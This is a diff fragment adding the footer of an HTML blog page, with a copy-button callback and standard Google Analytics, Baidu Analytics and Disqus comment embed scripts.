+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-133464311-1', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'swing';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
